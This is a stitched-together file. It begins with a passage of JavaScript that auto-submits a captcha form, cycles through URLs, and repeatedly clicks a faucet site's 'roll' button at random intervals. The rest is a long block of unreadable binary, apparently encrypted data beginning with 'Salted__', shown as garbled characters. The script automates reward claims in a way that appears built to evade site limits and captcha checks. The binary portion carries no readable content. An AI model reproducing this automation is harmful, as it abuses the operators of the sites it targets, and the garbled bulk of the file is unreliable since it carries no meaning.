                   document.querySelector(websiteDataValues.captchaButtonSubmitSelector).style.display != 'none' &&
                   !document.querySelector(websiteDataValues.captchaButtonSubmitSelector).disabled) {
                    if(websiteDataValues.formSubmit){
                    document.querySelector(websiteDataValues.captchaButtonSubmitSelector).submit();
                    }else{
                    document.querySelector(websiteDataValues.captchaButtonSubmitSelector).click();
                    }
                    clicked = true;
                    clearInterval(captchaInterval);
                    setTimeout(function(){
                    if(messageSelectorsPresent()){
                    goToNextUrl();
                    }
                    },5000);
                    }
                    }
                    },5000);
                    },20000);
 
})();

function AutoRoll()
{
        var timeindicatorfreeplay = parseInt($('#time_remaining').text());
        console.log(timeindicatorfreeplay);
        if(timeindicatorfreeplay > 0)
        {
        }
        else
        {
                $('#free_play_form_button').click();
                console.log("Status: Button ROLL clicked.");
                setTimeout(function()
                {
                    $('.close-reveal-modal')[0].click();
                    console.log("Status: Button CLOSE POPUP clicked.");
                }, random(12000,18000));
       }
}
                ip==~\[%]//#/*(Salted__ÖìyÚ[e+!@J!lݽk]􈄈Au¹±ÐÃ]ÉSJõkuÇãR^°*5×o!µZ8³ÕÇvýRRV!Ppªá×2ËPN8sCý1`wéƫTÛwçaxa¢,,Ê-ï9Í3cìl1Ô%n¡XÉ§L	µÚ&çÉáÏc?Ý8;[¸Òq33ÇÝà¥:§֛suxA%[ʍ8kØÄðaoiÂïYz@Î'Cܚ4ALúÃ&)Q+ZøköBWe¾í±.b4%üOîÌô#ô<nxX¢
i#!>{-¥,õh¢	۸Íßhpô0ÊϴS¡ã¸I²mol³¹_è2òƢ&dibõN>6æêlmÁ7e cäç;W	K 0ÛÖCB뾹ÌՖBÎÂ
®WîYnç×eò¯üèÖÕÔhњíe<F±ހ¤=Õb^r0z+Ð²¯]G0èå±ôíZ|ÇèÖÖ1ÍtÆjâÉRÀôô6®Ýd©5Ф%}
uìc	îÕøÎ-'|d¸ê
Ð'ÊØÄüÌh]xÊ~V
8ÇØåCàô¥±â*îÔË22eW*ûµÂY\?H#%!°¦(­
;1à»÷Ï6/ÍÅfïjö?©3àvÔÄ2+¡©8'DyÑÐÄÔJ°ð(¨¦wyPjl«÷â:Y=×öÙxÕA¦úBxA|픝æ5%Jô!»Ç*¹þÓ$;ù{aëv#>ÈW]¬
¶¼;äÜ4ݫ°{êôÂ1ïÝéÏfýڞþYÃØgڛ ^=ÐTe¿Úò"ÿ®òD?ÆÇmma=£êÄÎPÕxÅE/ÙL¡Kü`Mñä¹Ñ{z±ao?nvL.äpUà¼_¤ӝRv~ÁZªP\5LdܚV+EÚ{¬SÓÁû(¸'Dð;
j«L³ͽïÝ
»Êú^=¾¶±٠vLõÉÁSiÚ~Ã|«XâëÞå;��N);;Ée N!÷¿jTb$RÂäFQ¥I#Ã.¤ËÐdҘÃs¬JݧÖE6k*Ui«ÔÜ(ÕdáÉÜ_|®dr0lÚïGòxy# ÍF¹ÌïôkØý$¹ç&ÌÏÓãÑËOEW%É0ZËÒ`U°7AÕұX*Kð}=¼Ӈ Ji·©ɡï;iÑ§¨CYÜjáF¨(3î9E¤TÏ]hX¼ñ͇æÐúOü$ñ/Çö²$²]&m`?¨nÔ(ðϹ2¶dV©(ֽõ©?~sOR8TÞIDMÉèÙ1ÓôSg{LDkðËPå$Á&ɷn» ?þnx|Æ þ¾oYíQ¦Ņ¶Â?m0JÊ3/MÂ3÷Mw±ú¦Gð}Ëi1®ÓØp.wÛtY̷-üäº`òܜTg¨¶¹µFäY<²¿B΋[éãC8g<Wö!Mõñ*b\i7ËÙÈŨ,ýeÍYãÍf®®keRÿJm+TrðJók¸à[ìm6ÑÐL^LAfɾ.33
40XäDÅiÌ2úN ÙGìÕWÃ=¿۾Û	ÿqÈËÃlGĜ
»øÄî3£jåÍsÏìIҋ,,GQÞñùà ã¥Ô#|xyzásњÀÀ2§§	Dzíåi¦r§ÜÁW¶?ø¸Øi¶%b`cñ·Â~¦BéH͹²ûëvòÆÀhӷÙ8âkIýú/5	ÇòÈ
ábJaº:Zµ
kÌAùu(~r
wè}ð¶üü|otG?§-&ÚÍeF1Du§2"ÞLݢUÎV{õªEb36  NnýP4(qN9Y§Øj³JM¹êò´µ(/m²ïxÒWa,ý.\-5¶ý´Ó)ÁÀ(y!¶2pR®­ù+|Ô-9ú<üû:]N¯âoêM!Ï06d¢m£Èlp§bSª=t6²ìfÒða)W»ãîèÿ*Õ0
=ý÷1®Ù{Í3¨àhO¯ӡ;Z
ÎQ5¦P%ˋq£³úN4[
Z §Jõ¶Êx¶é{cô7V)Vjg &¥¥þf̋L
bÖwæYHT81£¨*|¤ÿîÕÿù}¿dG¹e×^w{ýh<aÙÓ*ÿÓ&êhðÜ^ÉǸÇuiڴ {FÍüK§ʙwÓ7äÜÃu6IEOÅçÃ¶]ig IÅkT¡$»Ï@®ñA~?>H*
ßxc°ªÂĨ£H©9ùçòf&*úp½®?ƸgÛTÞÏÇç8oI	h9»Tî¨hn²ÍC÷~û£çèàF}ɼ6Z.C=Ml¥¤¨ґoB&{êZ&~ôÃkК=
vM|JFâClëËò ãÇ>i©Vb©ägg3.KPëý&måڱÉ&pèq3&.XqÎ §AùÕ<Oʻ2ê6Ãro¨1d4å¯vRü í×y¦póxåÉà.
	Թáú=2°
ê3]#òî6cf¿]vÖÚb	¯§z\¹ÿÏÎHHphdw=ot²åñbíÇDg@Öi4Ño¼üÄÖÿ-(±ÂàP°½.©ý"`èlsÎTªgËr æù¿)6ì°Ê>ð½sw_ú
â¹aà}ñK[jCދÿɝaÏ"£±ºÃ
¯Øí~î7y;»Õgø¹I|Ò[­
1Ha5Z7m¾`Iíªúcŋ%ôû¦ϙQ ëõו_ÊKÍxÍsÜ_íòÄ<0Ƴ¡YH0Z®ñÿçæ7XDlôµÈÄëd*R²BÂ!ÝXJçÆCé-ãÈ]êGÏÑWk§ñ¹|gÕù¬ïÕn£ÄNæ%ùjbã¢èï"Ó]°oB`ï·ÿmxÅ\ë½ÃF$ëÕ?VXðbø/¦u`Èõá7ºܛ½·.^âÚúmj}wK8Ár1[p¥ÞDç§í³}Dx.OfwáKðö§ ¯gÌ�cy/ԚÉD*õò¤©
`¬ùuËÃYµÔC܇ö2éÂÜ6Åxm°º$nÿ-ý¹W0²OFÉúkJVËȁå6°ïƬƘÇ0»ò2¡´*Råüz +ºLOBîà"½'¨	¡+rcÕýçýZ'£áõö|äDÁ_L&s
ïo@aÒ#îT¨ÄÔ#Ç×Ö:UqǙð»Æß[3É,«j6ôáèå˵Ð[µÒÒïIÈ~ûõôtçh)x3­|{|@þa/oeõØ1ó:î¦¾×ô°ò¸@½/a/´B@/§U]ûÿQdÆyɽ1ÑÜ^l:¨<Ñâూ¶E ÄzÁèqÌð­½èÍUB§3M
ªD©Íé\Oý pÏ?zSyö}öß+ùÎjhá_vìCrøoôàe,,áS$è<½¦g«Z?h0µáS¢=JLd¤Wn3:bÑ��mJ۽o¢ϼpÉÑz%
P9&W£Äk-¨C{°plYàq¦9mùÂHÌÃNäNgÎ÷ö&uù®c×
6N©ê!Ë\䃀JÆ頎L%Õ+4PÄ]èZþÀg¦az(cç[ÑF/ôñ ¥𚓃FUכàô¬0nª*|ÒÄo;Ã}¯*ò✾ú/¡öÕ )¼â¨cdr»[j¨:ÿ7Å<¶XoAÉzxǛ[|ì¡\½ABêÈ;aqöÒ!%ÇÈ¹VFÏA¡m8щ¦ÓMpÃÓDreü-;'ViÊگ [Ö>x?1Çç³.ÿµúo1븥òMõËï­A	¹MTÝÊ9%ÿ¬¢.&ê~¿maÍįÂN Çìá	ª:·¥g°Ä(uTGNåâYñS:CT2/Ù0«E¿$Nà»yÐ¢¦g?¸Òý̏¬vÍRfÓÿ±®¥³Ü+Õ7¯Ú'·R<¿qø¤¤ãnªFüp6¸Ïê¨Íü4¨æÂ*¢:ÂÌi¡Ù"6T} #ߊ%}"¦¸úÆÍ%¼)¼Ú`lð¶säCþlÉfrj¯¯!ÀêeìQº[LW¿Ei6¹ù3Æ	züåisH/Æ0Äùo4bwaD¤ÍWVHQü.uìlY¦«>
ºÃKZ[ÓËpþ¦Ìǉ«RÇ
x>hAïg)rI_9PcÐ~7c}m	ñbÜ*ßZ¼È	§î#ÒP¸zP͏SE +ÎUàËúO,.Ö!SÛô¸´«ވÕ-^Ð;Âå|Ä5TÊ]°Hï?ߩ_²Â֎އ×W	ë#u¼Ë
É4jIÄÿÿL³¤:låñçíEÌCv@n¡òðÒ_ÁCÈÏß.¹ÊuaïoÆï*UmÔ'­ç]=1ܸ)%W,ÊÆ;%ïañUċMº·×ːÕIK|È=MNÙѼGüèR×qE` ìeYîWcò«¦û¤ÎÈGøÑ	eÿáË]J°
¦ΙÙ|$E°¤%߆Aóђ¾æ§è÷#â»ܶ§?¥ý/ø
V(xùJˊһÅÏ\ò7ǝ«5äB3ù·)±¯è­ÅÉðèܲ«2Y4qgÃåKsĐÌþ&¶B.ö¶òKº_èق&ã/bvüۘÞÂf}kÁñsE,ÊhEöf$úíâ´ נ?#'JA¶½Z,)xc×ÆùÄj®ªçÙÃ)Ë,޿YÏt*u¼}G¸.Tæ¾TÅp@ÑLPvé_û_»t8cDG§ÔÑ߾m(®`sNÍFè%Ø=èa0ÂþãÈÇ
ÓEÉãû^¡®àmH]ðoWè@ø9`ÉôM÷7>pÉí×F½À´V1ï¹Íî'¸qª\?QN<>üIîbÇÍýí{¨=»Ì;Pu­äÙy÷LÅÔu¨ç÷~èø°«\4$#¬|Oî¦ÝS5w,Jò¸
ÙÃ[ÀËВ²Ѭíp³Æø¹®³u@:qb½aã_ãnD]¨¸ӛúCÙÙ4wÛíÛGª0³ýâܘîÄ՗{^3Mq¨ìY
vçÔ,!¥nëÎ?ú¬ìTxÿ Ï5H-ü;¹R&)'l­¤Ær­{Îø,&öÊÁ$}ËÉ`��îã
v¾ª¦0OõG²[.ð­u'±Ȏ&ÃØȎÞs˪Ă8­wÊ1Gg«ԝÂ(¡JÒÓ`#r6Ii«2ô
v{öutÊ ¼àD7®´Ùu²(|[ïBÿCÐ~DæSvé{ãB7t
8
"º¤a\p#%\s^a'÷54´U-`¶¤ý¾=¿µ~öóh5Ë3ÚÔîmÏ5k¥&Òç0ËSÒLõ}B£_õ¯9!IÃ"KèÍıµ¤ÁeËFI®ÃÁYûÑ68£t0æÑß_âîæ5ḛ̈ÜµÂõúJW §>ù"9§zqÒäÀù h
_p-X¢;ºU'¦ S«>aE.f­õ¦ÀþÉ;ꛨ£ÃOhúÀ}råF¬0>t3TÇõäF¿1¶;°%Jwjê¬"
Òw£7ÈMW\ïÓåµ93±î«õ'ÉڌþaH~PZ1É DÅ/¹¼]/Y4ܸµÍöG}gKÂx¹ü¶9 >É?klºoN¾úX¶b±OϔªzIPÉÇß'7KÄÈڋ­òÖ}ÿ¬ßS[å⏮w?@£ú¤ÖÿÄñNéOï��äÓB¸À.ÔúŘ^^Öò~٧.Yå߿®S"Ʉk[Å0ñ«äu7&[ÑS»A:^V;¼LϺOÉò?mªuwÃ&MºÇß.ӶüiÏ&Ì~I£à6kʌ©Zm¶¯bioÌ2»ԛg`Ü
$<ìùæÝãjl¦G[ e:ËôþØJ³ì0]1(<	¼	¸¯/µÿkݱ1â(=°ǝÉÔsoê_ §ÆØ±äóð	¯;ßnjÞOéß共þ>øy)¶çuOÇ8°täìæ;î­Ú¹¢®]ՄÃeBö»]ªù©YS=¾Ì5jÜ×'ìÝOl;á,©jJ³uñE\mòù,°íPQê5½NÑp?µ]»¬<7ʪLï	'sÃÔٺ}:ù$,ʱGO$¿ëØâìuw֙F9Ø'æ-¤é q HôÀÏ=Åä¿
È[³v¢îyuù¼Ɋá*SsÛQÿèÓ&]ΒT7ˑ,t»ô¨¾Adø¨üù7MèTó¦	æ\3ÚÊHÛ(\§
¾¥MôTӮð»ÑTP¬2æ{iâ¬zÍ1Åç0ÓJ<ùÇ¹zÇì3Î0Vhíæió$§͐w T
Щé¥÷¯W$ñÕÂã±%Û´|蚌éfªN(,bç-å¬¿J¯à_m9àN«sÀS§#¤^@<0ô9 k!LÏår>+^¤y~,Vw°®þ/äSù°0¡
*;/ÍÎâýØç¤[t©Ácèe;Ü>	)ïý³}h|õà,ý^9åvv!^õK\¢_©þ9cÔ ÛÇ~ýH_èéwÃssð}<gYCÃäxA-ꔏÆr¥Z=Uß[¾×ûwûÿ¾áçi§>ëÖÝ3ô2o§¬9x"³7§f´jeüÄs¨wVtk.ýñ*?u«ôêÉU^û"%}¸¿ZÓY£{{d½p1Ⓓù¤¯¶GAºæ ⚋bí¨F9ÖOF¾QY§ó£1xi-]Øre}Fǅò%ª¤&ïç ÊIÜdóTŠ8;C?ütüÇFÀÏÑQ^ÿb7¨ó4B]l½÷ïMÿZîGT/=É×GáXåDÃ-î/4øhÐ.@Ñ*Å	¯¤B?Ć+)»ùâO ºZPÓf;´	õ왅X-¥Ï\©>øx|âcsýñ3	L§;¼ÔÈÈçß8ôÛ
cBÿg°Ävp`³ârÆ~+äa&	¼÷ÁϔTÛ,\Pe{xd6éÐcÖîtð½ø{næQc°3½¾Á.6v±F,bÐ:8h¢ßüJ)	pλ'¹dӄå"X CAªÛ>îÚ*?
×Vö\'j,BÁWò å©ú±"ӴVчuâÈf¿©3g´LiøhÁ÷~ÞåÊ[þvՍ§æ0egv8QðÑ×ԷÈh@»#!g×öájµÒØUS!ð6²±²ΣË2¢^V¿g©Ëۭ¾ǘ"«_>º6åt·ÑÏÎ¤Xiòxòɤ^Iô±}|²²âRHt^ý:yge7AÌï!
LÄÛBõ¯Út£ð~±6iæ¦Ԓ¡دu-@-øI4ÿ¯Ûð¯Ii¢ÁãqµÕÊ#ôýß^M\ZL@/®ÎÜë¡ÅÜ(×S³;õb4@BLL.+Ðü¶u7Ù'.=¼iˮ²7¶:¬eÖí§û^QkZ(äo¦R ñ÷gÄI£ÊÕzadÚøÆåÓò^Vo¡ì>ŰÛyL¸1s8@<ü7ÇiàÅ:£l¾6*Â*©½²úÂ[rÃYj¼a¡í8'hð1qåÐ7¼Àp\ëù½«nÜÆØz¥"l§Ü7ùÁÊ1"X­-~±¬Oy¿ìðj.L¼þV
Áßc¹	򸹾v&)٭Àßػ®®¥.©wZâ+Ä&ýH^Lã)¹>l?ÚÃ{=üä\õà悦P?´6-[õrKZ§-×è3ï2%H÷áëFASb» þX
Y+G̔«ìÿäÿà¡ÁCó7|×è\+· µ
和TùÊ<]ØFÙóòðÌ6Ú½+$jg«Ìéþ½læºñww±0ªy[å2΀4¿-ñÑ ?Ö;Ðõåv;1î½?j9*<˭ïT(L½¸LKíÑjN/>NggKèéÖÜï?-³&ҽÕì÷2Aì~¸rvä$6OÏÔt5bs(î|}L)ÏÌ2~¸¤àеtUUÚж RDÑáö%~ö ٟ¢Ý>×åñ1>~ç!z=Ȏ½áVëAòb²ñç²	ïBwʙ|i®å©Kö¾'ÊÃ
ZVÝrºèAg½n·º·cýOîa8½VñÆھj~ßAÎc»tAér1ÏógpC}l{îGɽ|8õ©4Mî7f÷´ZÌG²{÷ÅØôÜy÷©ü¼è:n¼O·ýàb¤Οðî3jÂJå>¥щÙì|ÌC/kîü2VØlNQ	A¸¼s§/GX´IӿyåvýώÀ߯ÓÃWӟʍ(«|+æ_¼¦GÔóG÷©3WViϼ.zûÂػâúwlÆ+0r´³vѫ8χv9èyë.âì~ÔÝ¦ùIáɮ9üçN¦÷e'æöÎ\гÈÓ`ÇՃìÆâX\$³¿´ø·µ%°ÍQ±6YX\dvzrêç¸Æ?c`[¬gG¾RuwuÍU«(Lÿ8æ#÷´(£{ N-3ÕwÁKsÔ°8·¢æs³b×E׽5íêUÐà5옅epýÜ?³7<]ÞoTϞ?U75Â˞­ªñh´G£­#+|ð-{Ú̞ÆŝN{`DËÏM#Ý1ñf	Tj7¯°Ê*ÖʺEÙ<μmóMÜiKÒB˳×aDmãA­ïÍг¦éú%YÒi"	=$®?qÂ&;Äú¨ʎÓuÔÇÔ'un°Ö-ûÓ1¿_rÝÊä®QoHA @lyK3$f°Ç#EÄíêù­ǃjµ_²ä%lgRh¡ÊÕ¨:¦rêþl¾²kûҸ dû_¢|Wü"ª]ÅW¯]´°֒þï7ç{zßÑ,FÖ;«ô²#¥:EKøD«n*ÖWå+֦;â)îmÞQå)®·Cð·ïLMZ.*ø"áDd-E¹17.òw۹Ì*éËíXíðaäó<Ö
СH9[M¡2qyVßo³é¸wAµ:+®:¯9§~ñ¥i(õvtVc3>Ãàé±½á¥üÑ"e隇s0¢J§-.À;"hGº£ïҕ?®h£
-÷4pG!+'¬àeл·Gʼ!AÎi:e^èxÒ\¿NÆj*@ÔjÃåÞVÐêæ«4ÔÈX$ëBñR®,G6ÀÌBL¢Q"Uþ·¤Èf=­½iå	þ^@±{iù!iÞ&¯ý/æ6kL9òh2ìàdñ[á܋éÛZRl 7Ôi'ßÛԪ¾	Pd*kðǺ¡ÛA-¤#kh°g½Çh3ÂL%[a4_ѩýüôv!ïoeГÝmóÙöÐG¾èiØ&
õ±2å¢+ÌeãÒuOrø¬¡f S^9ªÞÛÊöS|åTqȅ$È-ů!Kõ³Úi%E­¨n¸´nïMï²éçÅZHP)îöÁÕíøéYmí.õ}½å+!b¢ë¡<¦Çß ÙöKCðe÷ÀÓA	,³êÁô*ÌNï&kl믳bªµԥzDVØ@;¥_vg̘hw´ ¦Ú67î«n£yýC¢þüím¿¹auU;.¶§âΐêGÀ«(ÝÔ*»£|Xã/×왠Û¡föµ
.ì32Úr§S«ÊÕxÈÄîäÇ6ØØJ ´ú¨ÜÎeC«_F±û$ݰW2Cü3쇷eÞ=U_ÇnË]V/K¾ʳm­@£dÓÐ}R:©&pñý}èSþ]ÿeab=Æ/=8þàþKçǨ~>«T½Ôi$Ôå߮~y4ٹQìòïV(«ÅtÆ5p¸(äíE\ó{ÈLgÞ4ÇÞ$R2ýø4ñs©^"æEںªÁý£¤'<õeTùå*ÑÁP^6¾ösägekÜïÒWy´'ܳð©ám¨߶&UÞq²7Alzý»LËéeþá
&ÎÅ-CËËÔ(iÙtÏÑáN/ê¢1ngÖ)úR/ުx(ÍÍޓc5²q:6n|áüPEÓþ9³¦þM´ÜÇøvÝ2¨´~È+q;sömª"*¡¶÷Îë˩Ó`¼
3å9 ûC±:?ò½|2â»t»ޖc¹"V@Näï87á  ¬) 5ËW\J|@êÓ!ö"7êÈÊå¡߽?DªÃTêÍl¿dc3²týq&\&¤;¢͆O©\u¨õ"¾?­hñ[«:íOsݗF ØTó­ú¹
æ5ҡÛý¥½Ç|§OPÕÛ}|GI²h¼PT£´T¬ÅÏÕôö×Gffx°<­åoÝàöèC=ÊJëªnÂÛäI,¾âVÒcd{i¸oXvª© ±CÉuÇmª¥²ydÞDÈjñÓ#¢M©KOüÌñ¥çBKg9}ϥYe-íwmÕ§:$ñï+Z¯B+Ø=3Bþ+磠Lírò=i<ƭPnø¥d<ñ/ª2-ÈÌZ ×Üúýøz¯3þ¿ZÓ}Oâýלx0Lý~Ñ=Áٟn%HL<®µ0|}¶Lm>
¡¼.¶÷}Õb¦ÝÿXÁ}E,õZ 7<1!aGõ¢<Ӡ£KgZoa7Øbxw2ÜNĦæ¦q£ÜÑ
s»iãøQ*aú+ÀRVõh<o¥¥ïÖ!ôÂ[¹ۖùÍêi1é ¹üÍãcÜ+iÆ%úÀ#Ól»ÿår@ÅQõç2Ú(ôÐ'qcPÕRwa'úkP¾9÷#óÍÞõ ãhJ8ق¼GJúÏn8ÏÕT$Õfkñá­¹ÁMUlCZÜĶè¥f¨\híÈ9KGìAaÒ!¸ûfd!ʮAülK§W=GòÈæb°bØjñ@üSt·
ïUó»ΈM¦²î5mö"ߒÁĹ°ä»Qo´®þSüŘô)þS¥ïCÌ}?~¾/Ö`üHmL³ªEüÚô¥âqo6rzÆï.øøÙq p~©råֵ¤ñ½UFü6^SÇJ쮶
æYi/Í ¡,®l¦[8¹Ç)D¾T¥q³¿PuÙñaZL¶¥8£ݡ߇ñçÂïå	ïñHÃoko»÷CªDN>Ús¢ïsü׾£`ÑYÜ-óLVÔãï/O¼Ë.'¦ÖrõçàiªÓvþi¦ÏküÐò	L¶®±]¢}÷j?ßZ=¡oNŃ©F>Ôږûå-7½S¢dÔ4q  0 ä±&XKÑג¬i/	!	.ú»ÍØðn á¹gUaBOAß`ÿޜT¶®÷ð3ö©+o5V֫X¹û0·ÔÆyïZ,+A¬5'4m²ñõúS Ð}
W¢ïJh4Üo$cswÃÉ*¨Óù»© ¿eg¯lϵç=¦ÃNÁCfÅCÌ{7À]íhsùÒ9¼w?®¬Zå9 G ´âPxqÅ2èZQȚ¡<î|<âûyZðQ3¥á©ôü­Yd½ÚúÑt$áø¸Â	µÝ+¢2ñ²6kf?ò'@zåLץ(OûçbÕPÔZÀõPs­Û!áÊY²8C÷:}&"ÎkD)¾aT{Évȅ$R%ÆsʵÚyÞß	å詉K¿ðÈnúHX/T6B­cü:+zº5øüï{̣ß6maÃ÷Ñ¤vWnÖUó{¢Q16@ko,uO³(J¿&à8&©"¸$ö`9®°Re94õY¶:s¦¢¯#¡~¬ê<úJE\ivìtôÐÞV͞|k~MQÚâ´]7R¡@{8ùc-ælҢ´úÈ~H6Býö
	óqÝãߏ[ $³¡uûSú#ﭹöS^¾ø°úGDQ§̀Hyӽr¦4´²´½*º;Ç'8­
j[`¬m¬EHmø{¬ßä2«ëb��£ ÓrHSÊpþáÐ8´T"aºÆqµÿZ¾G¥f¼h7cCø¯!¶ò#ÈLN¾ÎZf¡7ÇÉÈÜ;τ˪N`뚭¹bÁ1Á
Î]ڇ0w&3.eF«{ÈÉx:³%e´:'úø.,È|¤ ׫ádX6Êz±Òç2u2­t.ô¥ª2 ?¿{©0ùjJ¤âØ	rC`À#/sY»Ífx'³LY­ו>W˂ûHXÎöPê¬ä± ÷w  ­V³ªï\ÞÙ>wI^n5 ¬¬·CЏnQÇÁÔiÖʵDÐ~Y&Qr¯$ëÙHNÛÚ!-Qu­J@³DGs7äY7g&¥©
ÏO¢ÆPçu}®ñEI߶kèÚ`(xRo¡N¹i¦({ÂL ÐĤNk爔½½æÿtE#õZhÃ;âäíuq¡8Vñ&uJ"a6¬ª4¢TÀÀ~Â'ÀýÀBæÚ,[Ü'Ki­uZԌn|ƽ­;ïç¾6µ&Ð|SI"ao!±¦o¦ pP®£°îÐ復
ö5êó|£c³9ê¼|²ßAO0&WÉUDS4É±7²}Ï
I  äöû6:Î޺)ôø㜚½N÷ð­ä' Ã֚âÛÂl~ð
'Xßô^ì9ީ(¤Q½æEðûÿÛ1®k@ÿÆklvì­vDj¨pIzüóQCg~¹hél¤Ãm'qívæçë½N{ÉC²ÍPÅÀ@½aí:p	ùÈYМPË·Rú(Þ0J«ioQ9¬2لóèå±òӴa-ñÒ)K륙á@Z	>óò LÿÕÙòE·þþn9ʖD"BFÙ$´ÑÄJíp@@Vk¢ÀEԂ×*䤭%fó$)­;Î]ÜËçݩd0ëP/çò½6ø@¯{]yR·þ󎗡¢C?r¤k<CÈ<qZeBs·§X8;ïÔI×FWɭ,ëË×øø·õµ ¿ÚCÓô!îhêYRÏbL9k,¼Rª|HbJ¥v<?æ#£ÏPJPK¤+L,½EÖÅIfØͿO	âC]ÃOE½û»äêãÁբ!9µßrºÃcíöPwyÞfüök$H.ù¤Õóõtvÿf Vgf"nÊ5GhIÜlïö-ul{âɦÖ¡gURSD¼Ê#aÖ{°c5¥)Zs-樱ÒOUq_gPH·¥67êÄòórÿ²º@Ö+µ£©¸{mtה»F°¹CUÒoL~ËÐ*Â;úZÏKO"J×êâb<ú×é-:î5ÅoI:/ºÅC²2¥÷)NÉ>¹ðv7æðrWuóýæ^¸½WM{ ºr¨vL(MTãwRñ°åç3ÖM¿®W/Ï?Iû?©Jºáê²TÎ^#ì2½±KI/Bf²2rPç<sNIØÇÇDh]rHöß0¹eÊ$É}þZ%M§ÝB,v¥5ذoþøï8+2:ôý±Ûõj[¼"
-ï(vL¨öÓÒÐ÷'³Ñþ°§)¦ ÑJxPº£º{Þ.Yۯ«w»íëÀéÛëpeéëʴÒ߼ÐH8«QÑ=½ׂ<aéÓècêEމÙDÝ/þ>s¯­QMa¸V­t1õv×TåMý݃nêDì	Ê֧ ëOâ뚗
S;4ȶõQ½
|¡Lw#[fg×i¥X÷I!\%Às ?èõéøÍ3>v=X}mø\gþW²&?Ë-HKä\Ca«\©4nr|, %Êå]¶ˬÉÀ>sM Ř,dt×\8;Ø®aîÀMÕêҔñzbعÅ:	MAI°ΪPtµ¹w¾bŐÓk%-LBÜ<⽝ØyÙþ.عܾaZ¢$¯rEqú½0n컨{{¢ڇ
OZG¢VnÊñ ¹3dݎV¢'µ÷pž PÔÓQÈXÛ+¿Fé§»±sÍ{ì-&¶Sìϐ^¦A®
IÕ)úÁ3Պt«ë:¨iÀ]¡±éQllÑ,ä7ͅjÌ'ð£42ìp³ÇHÎ>ï5Àfު¨¥ÈJѼ9iì[Õ¯ǌ
ùf÷_bxZâˊڠ9Îþé+Ð<[1xì=qþ¬¦Én÷¢dq£GH2ðu4Føp`EùSæOæۑ¦ÀFR?q]vrÙ~{`­8±¯ä¬ék,7È
ia1~
á`÷	ÎaÉtGT¤,e¢p<b7w¿¯ƴ¯¹F«nPôTNÐîÜã#*pÐþ¨ªÉ7}%[ä çH¨_>£y»ë4W
tÍ2Úi*Åilæh% F'÷?¡Vä
Z=Jªè¾5rúù¿Û_¢.å6k3íuûÂ÷TOýù<NR.KA¢C²V£þ¾§P§;â½pUùAgÄ8¡ܠ_¿JdÿEq}¤õä9ü_¬µëbR+L.*¨`VM@Ƭ0k TwûÕ")P7åüðòùs\xaêC@/6CM{zC}¨(֡¡÷¸ÌúæB§Ùtø"¦3üð¹f6³ëfpB1-Ý7Wû<öw£g'6y¹£ïúüWSkØ$þOï¨÷JgQ{Ë	Ã}&à)Ì8"Q¦$O>Ôꀙ>"LrÃßÊfÙȈðǏë>¥úɇ¨ÊÎðj悀Njxæc°õ0çXí «Öâu¶iߊÖZÙÊÁkpOÛs{Z\øY½·Hwýð1Ä\,ý|çCâöé·oQG±Ú\÷]2[~0¥òk[óª%垫1«y.¤¸Çà©Leá#É%×hֱ3ledhHzȪôS  ´§d¼¸[AX£NêâLÒéZj'¥ÎAå)w"{¨dSfÁ%zdi£SþÙ@4ÝõW­õM=¦õrA;®©m"¦©¨Q@Põ[2å¿ÎzãúóPåÏoC ͽ8!êӹ)p1éV<£~è?SoÿÖ.BõStLi³ʦxû8¬QÐɌ«{¹ߚ½ÓØþ$Oëc»Ý5÷6¸¢a4(ÒöT«h%mi÷QגÁÔ1x6? {=ÀÛ4Ñh7`AýÄÍj'Ô ²vù¡ào1 ùíø¯Á/¡Ý% N7I¨àæX³ۼÝAÝûYÆ4§nfu<¦Cñý6Uév°¨U ~rèÊÌäSã!¡nÑ.n+4TÞòdIJ6Díb%þC`b¯Éü+XÌÉÜ/Ìi8³Dõ¯1¨ÌÄCÅïs7ƭS)Ðz­ãèÉQ+ԿY¨+Ë\1«A\ßD
ÙaZdq¥¨Eí§n
©ý­>,Á/$	®ߣÊÈQS͔syÙ 6<Cï8Ñ'& a-ªQR&V菳äöÖÔ{4¶§î:Kåúö6x<* #åù½q\lß7^8ì¾ýÅX°IZéq_>à×DMRPjxAoyäI5FAÇéR[AGe£ðÍxD¨"©rAaæ[µ<ȂYg²þþãb^Q®?P·ªÉÇÕÜâ®0¬=²>êbíÚ<£Í¤}wÀçgܴpB­ñ¯»iª^˔±ÌÞécQqµQ.ï'úùaC}-T!©P^CgC|´ p¯Y×lǲЎüêÀ^N@lI±íç*ýá9ÞÍç;oøóÈ╭¯Â5§ЅºÑÙÆ;£¼Àqå}MõU¶à5çöÝË(H<\ ڡ¤J±5WóL	˳ò£
óYY_.9=7¿2@JËÒõ@qåËxX:̰ëOCCÊ9Í52͘àïՠ@qÎç|7§yïÖ¯W# }¾Õ:Í@¨Y/«ØVMÿ¿úQôr(³áPx*¨ôy¸N/¶ðzZÂ'¿ícneù2Ä
v¦º	bíöעpÄãtöÓèçTò«]¡Få¦_ÂòT¿ð#Æa-a UCÁoJQÕìz©N:Ä×ŀòÎÍæmp¢¯¬ã9+E¢¾ª¹u.ã¹ðì¢G3¦Ï,mù0ë{cw®vé}vi.ÍT®欶ºoh.ÏÞqÔ,ÍçŇΩcNoÇ@,kZÚ,0£ã¥/±k-9Ä~»Mà­ۓõyŬRVÚ	1+*$ÜXºsþC.¦£ÙtäaǱق$¾¬Êýúðé#±jµ¯¶
°¨Ìϖ¶«¥LاˉäÁëññàV^ PGv¹Û/-9+rÉJ-\k^ð?µ¨+¨SpÚ4{ZNGش'¥Ödb­¡P:ÃÉýaDÿ۾ ìlâ'O3GjEkï½ѣj¸îj¸¸'ªÃ}C0÷cv¿2ª <
C³ô°ÉUlàrÂæ øgáZ܉בPlxé²KeW¢JJKD¾ن3ÅØ»vnÖyMeðD£äֆÛƕYS¡ÁV
dÍWÞÂáïp¿êÜywÀÛ#,\eìÂÐñþCgíڭÌϏ[&øÁ2-Ëaô8á}ݝ¹lK͠=ý0½û%;·Tþ÷ک»R/#9x֐ã=Gvbߣ£cw£ÎzôäyûÞ9ìE&þ%wJZÈ0@ý) áNüÙɅa²E'id啒ì·Í~æîz­~@ÝíYLºժ02&vJ£Cjü7ògñ2ô¨ºÈ;aëĬFý¶{Kñïçâ:¦ËíÄßG³@'øäO?¸À?¹¼~8g7¨XEÙ°sÝøµu×Ù6ö°B2M¿Ûæe:®ú.gð«ÐTyîiV÷åq_¢°@ÝÙG<½#1ø´AÎi }w©pÉËÙæÏûóùip~Ç¾¿|Wîup$³*,¡Ä
